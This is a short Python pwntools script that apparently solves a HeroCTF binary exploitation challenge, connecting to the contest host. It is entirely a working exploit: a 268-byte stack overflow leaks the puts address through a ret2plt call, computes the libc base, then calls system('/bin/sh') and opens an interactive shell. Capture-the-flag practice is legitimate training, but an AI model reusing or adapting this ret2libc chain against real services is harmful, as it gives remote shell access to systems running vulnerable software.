#!/usr/bin/python

from pwn import *

REMOTE = True

elf = ELF('./chall')
libc = ELF('./libc.so.6')

if REMOTE:
	r = remote('challs.heroctf.fr', 7003)
else:
	r = process('./chall')

r.recv()

puts_got = elf.got['puts']
puts_plt = elf.sym['puts']
vuln = elf.sym['vuln']

pop1_ret = 0x0804901e

pld = "A"*268
pld += p32(puts_plt)
pld += p32(pop1_ret)
pld += p32(puts_got)
pld += p32(vuln)

r.sendline(pld)

leak = u32(r.recv().splitlines()[3])
libc_base = leak - libc.sym['puts']
system_addr = libc_base + libc.sym['system']
binsh_addr = libc_base + next(libc.search('/bin/sh')) 

log.success('libc base is @ %s' % hex(libc_base))

pld = "A"*268
pld += p32(system_addr)
pld += p32(0)
pld += p32(binsh_addr)

r.sendline(pld)

log.success('Enjoy your shell :)')

r.recv()

r.interactive()

r.close()